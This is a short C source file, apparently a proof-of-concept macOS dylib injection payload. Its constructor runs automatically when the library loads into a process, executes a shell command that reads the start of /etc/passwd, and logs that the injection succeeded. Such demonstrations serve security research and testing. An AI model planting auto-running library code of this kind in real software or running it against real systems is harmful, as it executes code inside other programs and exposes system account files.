#include <stdio.h>
#include <syslog.h>
#include <stdlib.h>

__attribute__((constructor))
static void customConstructor(int argc, const char **argv)
 {
    system("head -17 /etc/passwd");
    printf("Hello from dylib!\n");
    syslog(LOG_ERR, "Dylib injection successful in %s\n", argv[0]);
}